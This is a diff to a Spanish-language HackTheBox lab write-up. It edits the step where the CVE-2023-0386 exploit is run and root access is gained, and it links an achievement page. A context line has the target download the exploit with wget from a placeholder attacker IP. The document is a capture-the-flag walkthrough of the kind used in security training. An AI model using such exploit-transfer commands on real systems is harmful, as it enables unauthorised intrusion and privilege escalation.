@@ -137,9 +137,9 @@ Transferencia del exploit:
 ## En objetivo:
 ```wget http://<IP_atacante>/archivo.zip```
 
-Y procedemos a ejecutar [bajo las intrucciones del Exploit](https://github.com/puckiestyle/CVE-2023-0386)
+Y procedemos a ejecutar el [Exploit](https://github.com/puckiestyle/CVE-2023-0386)
 
-# 📌 Obtenemos acceso root.
+# [📌 Obtenemos acceso root.](https://labs.hackthebox.com/achievement/machine/2448097/547)
 
 ---
 ## Análisis técnico
